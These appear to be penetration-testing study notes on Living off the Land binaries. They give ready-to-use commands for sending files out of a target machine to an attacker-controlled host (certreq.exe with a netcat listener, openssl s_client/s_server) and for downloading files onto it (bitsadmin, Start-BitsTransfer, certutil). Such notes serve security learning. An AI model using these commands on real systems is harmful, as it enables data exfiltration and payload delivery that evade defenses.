- **LOLBins (Living off The Land Binaries)**: Binaries that an attacker can use to perform actions beyond their general purpose

### LOLBins
- There are currently two websites that aggregate information on Living off The Land binaries:
	1. LOLBAS Project for Windows Binaries
	2. GTFOBins for Linux Binaries
- **Functions**
	- Download
	- Upload
	- Command Execution
	- File Read
	- File Write
	- Bypasses
****
### Using the LOLBAS and GTFOBins Project
#### 1) LOLBAS
- `/download`: To search for download function
- `/upload`: To search for upload function
- Lets use CertReq.exe as example
1. **Target Machine - Upload win.ini to Personal Machine**
	- `certreq.exe -Post -config http://[personal machine ip address]:8000/ c:\[path of the file to be sent]`
2. **Personal Machine - Receive File in our Netcat Session**
	- `sudo nc -lnvp 8000`

#### 2) GTFOBins
- `+file download`: To search for download function
- `+file upload`: To search for upload function
- Lets use OpenSSL as example
1. **Personal Machine - Create Certificate**
	- `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`
2. **Personal Machine - Stand up The Server**
	- `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < [file to be sent]`
3. **Target Machine - Download File**
	- `openssl s_client -connect [personal machine ip address] -quiet > [new local file name]`

### Other Common Living off the Land tools
#### 1)  Bitsadmin Download function
- The **Background Intelligent Transfer Service (BITS)** can be used to download files from HTTP sites and SMB share
- It "intelligently" checks hosts and network utilization into account to minimize the impact on a user's foreground work
1. **File Download with Bitsadmin**
	- `bitsadmin /transfer wcb /priority foreground http://[ip address]:8000/[file to download] C:\[new local filename]`
2. **Download**
	- `Import-Module bitstransfer; Start-BitsTransfer -Source "http://[ip address]:8000/[file to download]" -Destination "C:\[new local filename]"`

#### 2) Certutil
- `certutil.exe -verifyctl -split -f http://[ip address]:8000/[file to download]`
